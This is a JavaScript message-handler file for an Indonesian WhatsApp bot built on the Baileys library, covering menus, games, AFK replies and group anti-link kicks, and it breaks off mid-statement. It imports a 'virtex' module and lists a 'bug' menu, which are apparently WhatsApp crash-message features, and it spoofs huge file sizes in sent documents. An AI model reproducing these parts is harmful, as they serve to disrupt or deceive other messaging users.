/* ProjectVanz 
tq : AdrianDev 
       rtwone 
       riycoders 
       vanz
*/

"use strict";
const {
	downloadContentFromMessage,
	WA_DEFAULT_EPHEMERAL,
	generateWAMessageFromContent
} = require("@whiskeysockets/baileys")
const { color, bgcolor } = require('../lib/color')
const { generateProfilePicture, getBuffer, fetchJson, fetchText, getRandom, getGroupAdmins, runtime, sleep, makeid } = require("../lib/myfunc");
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("../lib/limit");
const { addPlayGame, getJawabanGame, isPlayGame, cekWaktuGame, getGamePosi } = require("../lib/game");
const { isTicTacToe, getPosTic } = require("../lib/tictactoe");
const tictac = require("../lib/tictac");
const { TelegraPh, webp2mp4File, UploadFileUgu } = require("../lib/uploader");
const _prem = require("../lib/premium");
const { genMath, modes } = require("../lib/math");

const fs = require ("fs");
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn } = require("child_process");
const ffmpeg = require("fluent-ffmpeg");
const fetch = require("node-fetch");
const chalk = require('chalk')
const axios = require("axios");
const speed = require("performance-now");
const request = require("request");
const ms = require("parse-ms");
const { virt } = require('../vanz_other/virtex_')
const { jadibot } = require('../jadibot')
require('../settings')

// Exif
const Exif = require("../lib/exif")
const exif = new Exif()


//new data by vanz
let afk = require("../lib/afk");
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}

// DB Game
let asahotak = [];
let caklontong = [];
let family100 = [];
let siapakahaku = [];
let susunkata = [];
let tebakbendera = [];
let tebakgambar = [];
let tebakkalimat = [];
let tebakkata = [];
let tebakkimia = [];
let tebaklirik = [];
let kuis = [];
let math = [];

// Database
let pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
let mess = JSON.parse(fs.readFileSync('./message/response.json'));
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
let balance = JSON.parse(fs.readFileSync('./database/balance.json'));
let limit = JSON.parse(fs.readFileSync('./database/limit.json'));
let glimit = JSON.parse(fs.readFileSync('./database/glimit.json'));
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'));
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))

moment.tz.setDefault("Asia/Jakarta").locale("id");

module.exports = async(conn, msg, m, setting, store, notifigroup) => {
	try {
		let { versi, ownerNumber, ownerName, owner, creatorNumber, botName, packname, author, pathimg, pathimg1, apikey, hmm, gamewaktu, limitCount } = setting
		let { allmenu, menuall, menumain, menuconver, menutools, menustiker, menuai, menuanon, menurandom, menudownload, menubug, menusearch, menugame, menupo, menupb, menureligion, menugrup, menuowner } = require('./help')		
		if (msg.mentioned && msg.mentioned.includes('')) { Object.keys(msg.mentioned).forEach((i) => { if (msg.mentioned[i] == '') { msg.mentioned.splice(i, 1) } }) }
		const { type, isQuotedMsg, quotedMsg, now, fromMe, mentioned, isBaileys } = msg
		if (isBaileys) return
//==========[ settings waktu ]================//
		const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const hariini = moment.tz('Asia/Jakarta').format('dddd DD MMMM YYYY')
		let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const waktu = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if (waktu < "23:59:00") {
    var ucapanWaktu = 'Selamat Malam 🏙️'
}
if (waktu < "19:00:00") {
    var ucapanWaktu = 'Selamat Sore 🌆'
}
if (waktu < "18:00:00") {
    var ucapanWaktu = 'Selamat Sore 🌇'
}
if (waktu < "15:00:00") {
    var ucapanWaktu = 'Selamat Siang 🌤️'
}
if (waktu < "10:00:00") {
    var ucapanWaktu = 'Selamat Pagi 🌄'
}
if (waktu < "05:00:00") {
    var ucapanWaktu = 'Selamat Pagi 🌆'
}
if (waktu < "03:00:00") {
    var ucapanWaktu = 'Selamat Tengah Malam 🌃'
}
//====================================//
		const content = JSON.stringify(msg.message)
		const from = msg.key.remoteJid
		const chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
        const toJSON = j => JSON.stringify(j, null,'\t')
        
        const prefix = /^#.¦|\\^/.test(chats) ? chats.match(/^#.¦|\\^/gi) : '.'
        const isCmd = chats.startsWith(prefix)
        const command = isCmd ? chats.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ""
        const args = chats.trim().split(/ +/).slice(1)
        //const args = chats.split(' ')
	// const command = chats.toLowerCase().split(' ')[0] || ''
     //const isCmd = command.startsWith(prefix) 
		const isGroup = msg.key.remoteJid.endsWith('@g.us')
		const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
		const isCreator = creatorNumber.includes(sender)
		const isOwner = _owner.includes(sender)
		const pushname = msg.pushName
		const q = args.join(" ")
   	 //const q = chats.slice(command.length + 1, chats.length)
		const body = chats.startsWith(prefix) ? chats : ''
		const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'
		const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.id : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender)
		const isUser = pendaftar.includes(sender)	
        const isAfkOn = afk.checkAfkUser(sender, _afk)	
		const isPremium = isCreator ? true : _prem.checkPremiumUser(sender, premium)
        const notificationgroup = isGroup ? notifigroup.includes(from) ? true : false : false
        const isAntiLink = antilink.includes(from) ? true : false

		const gcounti = setting.gcount
		const gcount = isPremium ? gcounti.prem : gcounti.user
		let pp_a = await conn.profilePictureUrl(sender, "image").catch(() => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
		const fload = { key : { remoteJid: 'status@broadcast', participant : '0@s.whatsapp.net' }, message: { orderMessage: { itemCount : 999, status: 404, surface : 404, message: `${ucapanWaktu} ${pushname}`, orderTitle: ``, thumbnailUrl: pp_a, sellerJid: '0@s.whatsapp.net' }}}

		const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
		
		async function downloadAndSaveMediaMessage (msg, type_file, path_file) {
           if (type_file === 'image') {
             var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
             let buffer = Buffer.from([])
             for await(const chunk of stream) {
               buffer = Buffer.concat([buffer, chunk])
             }
             fs.writeFileSync(path_file, buffer)
             return path_file
           } else if (type_file === 'video') {
             var stream = await downloadContentFromMessage(msg.message.videoMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
             let buffer = Buffer.from([])
             for await(const chunk of stream) {
               buffer = Buffer.concat([buffer, chunk])
             }
             fs.writeFileSync(path_file, buffer)
             return path_file
           } else if (type_file === 'sticker') {
             var stream = await downloadContentFromMessage(msg.message.stickerMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
             let buffer = Buffer.from([])
             for await(const chunk of stream) {
               buffer = Buffer.concat([buffer, chunk])
             }
             fs.writeFileSync(path_file, buffer)
             return path_file
           } else if (type_file === 'audio') {
             var stream = await downloadContentFromMessage(msg.message.audioMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.audioMessage, 'audio')
             let buffer = Buffer.from([])
             for await(const chunk of stream) {
               buffer = Buffer.concat([buffer, chunk])
             }
             fs.writeFileSync(path_file, buffer)
             return path_file
           }
        }
		const sendFileFromUrl =async (from, url, caption, options ={}, quoted ) => {
            let res = await axios.head(url)
            let mime = res.headers['content-type']
            if (mime.split("/")[1] === "gif") {
                return await conn.sendMessage(from, { video: { url : await convertToVideo(url, '.gif') }, caption: caption, gifPlayback: true}, {quoted: msg}, options)
                }
            let type = mime.split("/")[0]+"Message"
            if(mime.split("/")[0] === "image"){
                return conn.sendMessage(from, { image: await getBuffer(url), caption: caption, height: 3264, width: 2448}, {quoted: msg }, options)
            } else if(mime.split("/")[0] === "video"){
                return conn.sendMessage(from, { video: await getBuffer(url), caption: caption, height: 848, width: 848}, {quoted: msg}, options)
            } else if(mime.split("/")[0] === "audio"){
                return conn.sendMessage(from, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg'}, {quoted: msg}, options)
            } else {
                let a = await getBuffer(url)
                let b = './temp/' + getRandom()
                let c = fs.writeFileSync(b, a)
                let d = await mimes.fromFile(b)
                let messege = await conn.sendMessage(from, { document: { url: b }, mimetype: d.mime, fileName: caption}, {quoted: msg}, options)
                fs.unlinkSync(b)
                return messege
            }
        }
		const isUrl = (url) => {
			return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
        }
		const isEmoji = (emo) => {
            let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
            let regexEmoji = new RegExp(emoji_ranges, 'gi');
            return emo.match(regexEmoji)
        }
		function jsonformat(string) {
            return JSON.stringify(string, null, 2)
        }
		function monospace(string) {
            return '```' + string + '```'
        }
		function randomNomor(min, max = null) {
		  if (max !== null) {
			min = Math.ceil(min);
			max = Math.floor(max);
			return Math.floor(Math.random() * (max - min + 1)) + min;
		  } else {
			return Math.floor(Math.random() * min) + 1
		  }
		}
		const pickRandom = (arr) => {
			return arr[Math.floor(Math.random() * arr.length)]
		}
		function mentions(teks, mems = [], id) {
			if (id == null || id == undefined || id == false) {
			  let res = conn.sendMessage(from, { text: teks, mentions: mems })
			  return res
			} else {
		      let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
		      return res
 		    }
		}
		const nebal = (angka) => {
            return Math.floor(angka)
        }
		function parseMention(text = '') {
            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
       }
       const replay = (teks) => {
            return conn.sendMessage(from, { text: teks, mentions: parseMention(teks) }, { quoted: msg })
        }
		const sendMess = (hehe, teks) => {
			conn.sendMessage(hehe, { text, teks })
		}
		async function reply(teks) {
            if (typereply === 'v1') {
                conn.sendMessage(from, { text: teks, footer: `By VanzBot` }, { quoted: msg })
            } else if (typereply === 'v2') {
                conn.sendMessage(from, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${versi} - ${botName}`,
                            body: `typereply 2`,
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync(pathimg1),
                            sourceUrl: hmm.linkmenu 
                        }
                    },
                    text: teks
                }, {
                    quoted: msg
                });
            } else if (typereply === 'v3') {
               var anuin = fs.readFileSync('./vanz_other/van.pdf')
                 conn.sendMessage(from, {
                  document: anuin,
                  caption: teks,
                  mimetype: 'application/pdf',
                  fileName: `${versi} - ${botName}`,
                  fileLength: "99999999999",
                  contextInfo: {
                     externalAdReply: {
                       showAdAttribution: true,
                       title: `${versi} - ${botName}`,
                       body: `Vanz Turu`,
                       thumbnail: fs.readFileSync(pathimg1),
                       sourceUrl: hmm.yt,
                       mediaType: 289,
                       renderLargerThumbnail: false
                     }
                  }
               }, { quoted: msg })
            } else if (typereply === 'v4') {
               conn.relayMessage(from, {
                   scheduledCallCreationMessage: {
                   callType: "AUDIO",
                   scheduledTimestampMs: 99999999999,
                   title: `\n\n${teks}\n\n`
                  }
               }, {})
            }
        }
		async function loading () {
                    var kyuu = [
                        "[█▒▒▒▒▒▒▒▒▒] 10%",
                        "[███▒▒▒▒▒▒▒] 30%",
                        "[█████▒▒▒▒▒] 50%",
                        "[████████▒▒] 80%",
                        "[██████████] 100%",
                        "VanzBot By Vanz?\nLoading Completed"
                        ]
                    let { key } = await conn.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Pengalih isu

                   for (let i = 0; i < kyuu.length; i++) {
                  await sleep(100)
                  await conn.sendMessage(from, {text: kyuu[i], edit: key });//PESAN LEPAS
          }
        }
        async function prata () {
                    var vonzi = [
                        "《 ⚡▒▒▒▒▒▒▒▒▒▒▒》10%",
                        "《 ⚡⚡⚡⚡▒▒▒▒▒▒▒▒》30%",
                        "《 ⚡⚡⚡⚡⚡⚡⚡▒▒▒▒▒》50%",
                        "《 ⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡▒▒》80%",
                        "《 ⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡》100%",
                        "VanzBot By Vanz?\nLoading Completed"
                        ]
                    let { key } = await conn.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Pengalih isu

                   for (let i = 0; i < vonzi.length; i++) {
                  await sleep(100)
                  await conn.sendMessage(from, {text: vonzi[i], edit: key });//PESAN LEPAS
          }
        }
		async function sendStickerFromUrl(from, url, packname1 = packname, author1 = author, options = {}) {
            var names = Date.now() / 10000;
            var download = function (uri, filename, callback) {
                request.head(uri, function (err, res, body) {
                    request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                });
            };
            exif.create(packname1, author1, `sendstc_${names}`)
            download(url, './sticker/' + names + '.png', async function () {
                let filess = './sticker/' + names + '.png'
                let asw = './sticker/' + names + '.webp'
                exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, async (err) => {
                    exec(`webpmux -set exif ./sticker/sendstc_${names}.exif ${asw} -o ${asw}`, async (error) => {
                        conn.sendMessage(from, { sticker: fs.readFileSync(asw) }, options)
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                        fs.unlinkSync(`./sticker/sendstc_${names}.exif`)
                    })
                })
            })
        }

		const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
          
          // wadidau
          const totalFitur = () =>{
            var mytext = fs.readFileSync("./message/msg.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
          
         //function setmenu/all/list
         async function menulist(teks) {
            if (typemenu1 === 'v1') {
                conn.sendMessage(from, { text: teks, mentions: [creatorNumber] }, { quoted: msg })
            } else if (typemenu1 === 'v2') {
                conn.sendMessage(from, {
                    contextInfo: {
                    	mentionedJid: [creatorNumber],
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${versi} - ${botName}`,
                            body: `typereply 2`,
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync(pathimg1),
                            sourceUrl: hmm.linkmenu 
                        }
                    },
                    text: teks
                }, {
                    quoted: fload
                });
            } else if (typemenu1 === 'v3') {
                conn.sendMessage(from, {
                    contextInfo: {
                    	mentionedJid: [creatorNumber],
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${versi} - ${botName}`,
                            body: `typereply 2`,
                            mediaType: 1,
                            thumbnail: fs.readFileSync(pathimg1),
                            renderLargerThumbnail: true,
                            sourceUrl: hmm.linkmenu 
                        }
                    },
                    text: teks
                }, {
                    quoted: fload
                });
            } else if (typemenu1 === 'v4') {
                conn.sendMessage(from, {
                        video: fs.readFileSync('./media/limvanz.mp4'),
                        caption: teks,
                        gifPlayback: true
                    }, {
                        quoted: fload
                    });
            } else if (typemenu1 === 'v5') {
               var anuin = fs.readFileSync('./vanz_other/van.pdf')
                 conn.sendMessage(from, {
                  document: anuin,
                  image: fs.readFileSync(pathimg1),
                  caption: teks,
                  mimetype: 'application/pdf',
                  fileName: `${versi} - ${botName}`,
                  fileLength: "99999999999",
                  contextInfo: {
                     mentionedJid: [creatorNumber],
                     externalAdReply: {
                       showAdAttribution: true,
                       title: `${versi} - ${botName}`,
                       body: `Vanz Turu`,
                       thumbnail: fs.readFileSync(pathimg1),
                       sourceUrl: hmm.yt,
                       mediaType: 289,
                       renderLargerThumbnail: false
                     }
                  }
               }, { quoted: fload })
            } else if (typemenu1 === 'v6') {
               conn.relayMessage(from, {
                   scheduledCallCreationMessage: {
                   callType: "AUDIO",
                   scheduledTimestampMs: 99999999999,
                   title: `\n${teks}\n`
                  }
               }, {})
            }
        }

		// Auto Read & Presence Online
         if (autoread) {		
        conn.readMessages([msg.key])
        }
        if (autotyping) {		
        conn.sendPresenceUpdate('composing', from)
        }      
        if (autorecording) {		
        conn.sendPresenceUpdate('recording', from)
        }             

                if (conn.mode === 'self') {
                  if (isCmd && !isCreator && !fromMe) 
                     return reply(`Hai! Saat ini, *${botName}* sedang dalam mode *Creator Only.*`)
                  if (fromMe && isBaileys) return
                }

		// Auto Registrasi
		if (isCmd && !isUser) {
		  pendaftar.push(sender)
		  fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
		}
		
		// Premium
		_prem.expiredCheck(conn, premium)
		        
        //aepka
        if (isGroup && !isBaileys && !fromMe) {
                  if (mentioned.length !== 0) {
                    for (let ment of mentioned) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                   const heheh = ms(getTimee)
                   conn.sendMessage(from, { text: `@${ment.split('@')[0]} sedang afk\n\n*Alasan :* ${getReason2}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu`, mentions: [ment] }, { quoted: msg })
                }
            }
         }
            if (afk.checkAfkUser(sender, _afk)) {
                let getId = afk.getAfkId(sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
               const getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heh = ms(getTime)
                _afk.splice(afk.getAfkPosition(sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                conn.sendMessage(from, { text: `@${sender.split ('@')[0]} telah kembali dari afk *Pada :* ${heh.hours} Jam, ${heh.minutes} Menit, ${heh.seconds} Detik`, mentions: [sender] }, { quoted: msg })
            }
        }
        
        //new coding message s kontak
        let list = []
        for (let a of owner) {
            list.push({
                displayName: conn.getName(a + '@s.whatsapp.net'),
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:$?x{conn.getName(a + '@s.whatsapp.net')}\nFN:${conn.getName(a + '@s.whatsapp.net')}\nORG:Vanz X Daf ;\nitem1.TEL;waid=${a}:${a}\nitem1.X-ABLabel:Ponsel\nitem2.EMAIL;type=INTERNET:uzidiio3@gmail.com \nitem2.X-ABLabel:Email\nitem3.URL:https://api.xcodeteam.xyz\nitem3.X-ABLabel:Rest APIs\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
            })
        }
                

        // Game
        cekWaktuGame(conn, asahotak) // Asah Otak
        if (isPlayGame(from, asahotak) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, asahotak)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, asahotak)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}asahotak*`)
           asahotak.splice(getGamePosi(from, asahotak), 1)
           }
        }
        cekWaktuGame(conn, caklontong) // Cak Lontong
        if (isPlayGame(from, caklontong) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, caklontong)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, caklontong)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}caklontong*`)
           caklontong.splice(getGamePosi(from, caklontong), 1)
           }
        }
		cekWaktuGame(conn, family100) // Family 100
        if (isPlayGame(from, family100) && isUser) {
           var anjuy = getJawabanGame(from, family100)
           for (let i of anjuy) {
              if (chats.toLowerCase().includes(i)) {
                 var htl = randomNomor(100, 150)
                 addBalance(sender, htl, balance)
                 var anug = anjuy.indexOf(i)
                 anjuy.splice(anug, 1)
                 reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${i}\nHadiah : ${htl} balance\n\nTersisa ${anjuy.length} jawaban lagi!`)
              }
           }
          if (anjuy.length < 1) {
             await reply(`Semua jawaban sudah tertebak\n\nIngin bermain lagi? ketik *${prefix}family100*`)
             family100.splice(getGamePosi(from, family100), 1)
            }
        }
        cekWaktuGame(conn, siapakahaku) // Siapakah Aku
        if (isPlayGame(from, siapakahaku) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, siapakahaku)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, siapakahaku)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}siapakahaku*`)
           siapakahaku.splice(getGamePosi(from, siapakahaku), 1)
           }
        }
        cekWaktuGame(conn, susunkata) // Siapakah Aku
        if (isPlayGame(from, susunkata) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, susunkata)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, susunkata)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}susunkata*`)
           susunkata.splice(getGamePosi(from, susunkata), 1)
           }
        }
        cekWaktuGame(conn, tebakbendera) // Tebak Bendera
        if (isPlayGame(from, tebakbendera) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, tebakbendera)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, tebakbendera)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}tebakbendera*`)
           tebakbendera.splice(getGamePosi(from, tebakbendera), 1)
           }
        }
        cekWaktuGame(conn, tebakgambar) // Tebak Gambar
        if (isPlayGame(from, tebakgambar) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, tebakgambar)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, tebakgambar)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}tebakgambar*`)
           tebakgambar.splice(getGamePosi(from, tebakgambar), 1)
           }
        }
        cekWaktuGame(conn, tebakkalimat) // Tebak Kalimat
        if (isPlayGame(from, tebakkalimat) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, tebakkalimat)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, tebakkalimat)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}tebakkalimat*`)
           tebakkalimat.splice(getGamePosi(from, tebakkalimat), 1)
           }
        }
        cekWaktuGame(conn, tebakkata) // Tebak Kata
        if (isPlayGame(from, tebakkata) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, tebakkata)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, tebakkata)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}tebakkata*`)
           tebakkata.splice(getGamePosi(from, tebakkata), 1)
           }
        }
        cekWaktuGame(conn, tebakkimia) // Tebak Kimia
        if (isPlayGame(from, tebakkimia) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, tebakkimia)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, tebakkimia)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}tebakkimia*`)
           tebakkimia.splice(getGamePosi(from, tebakkimia), 1)
           }
        }
        cekWaktuGame(conn, tebaklirik) // Tebak Lirik
        if (isPlayGame(from, tebaklirik) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, tebaklirik)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, tebaklirik)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}tebaklirik*`)
           tebaklirik.splice(getGamePosi(from, tebaklirik), 1)
           }
        }
        cekWaktuGame(conn, kuis) // Kuis Game
        if (isPlayGame(from, kuis) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, kuis)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, kuis)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}kuis*`)
           kuis.splice(getGamePosi(from, kuis), 1)
           }
        }
        cekWaktuGame(conn, math) // Math Game
        if (isPlayGame(from, math) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, math)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, math)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}math*`)
           math.splice(getGamePosi(from, math), 1)
           }
        }
        
                // Anti Link
                if (isAntiLink) {
                   if (chats.match('http') && chats.match('https')) {
                     if (!isBotGroupAdmins) return reply(`Untung bot bukan admin`)                                      
                     reply(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
                     .then( done => conn.groupParticipantsUpdate(from, [sender], "remove") )
                   }
                }
                   
		
		//reach
const loadingMsg1 = {
react: {
text: "🕐", // use an empty string to remove the reaction
key: msg.key
}
}

const loadingMsg2 = {
react: {
text: "🕒", // use an empty string to remove the reaction
key: msg.key

}
}

const loadingMsg3 = {
react: {
text: "🕓", // use an empty string to remove the reaction
key: msg.key
}
}

const loadingMsg4 = {
react: {
text: "🕕", // use an empty string to remove the reaction
key: msg.key
}
}

const loadingMsg5 = {
react: {
text: "🕖", // use an empty string to remove the reaction
key: msg.key
}
}

const loadingMsg6 = {
react: {
text: "🕘", // use an empty string to remove the reaction
key: msg.key
}
}

const loadingMsg7 = {
react: {
text: "🕙", // use an empty string to remove the reaction
key: msg.key
}
}

const loadingMsg = {
react: {
text: "🕛", // use an empty string to remove the reaction
key: msg.key
}
}

const loadingMsg0 = {
react: {
text: "", // use an empty string to remove the reaction
key: msg.key
}
}   

const wait = {
react: {
text: "⏳", // use an empty string to remove the reaction
key: msg.key
}	
}     

const done = {
react: {
text: "✅", // use an empty string to remove the reaction
key: msg.key
}
} 

const gak = {
react: {
text: "🚫", // use an empty string to remove the reaction
key: msg.key
}
}  
                      

		if (chats.startsWith("> ") && isCreator) {
